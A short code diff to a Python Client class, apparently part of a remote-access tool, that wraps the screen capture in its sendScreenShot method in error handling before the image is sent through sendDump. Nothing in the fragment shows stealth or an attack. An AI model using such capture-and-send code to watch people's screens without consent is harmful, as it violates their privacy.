@@ -179,7 +179,10 @@ class Client:
     #  screenshot func
     def sendScreenShot(self):
         print(f'{self.addr} \tSEND SCREENSHOT')
-        image = ImageGrab.grab()
+        try:
+            image = ImageGrab.grab()
+        except:
+            image = None
         
         self.sendDump(image)
 
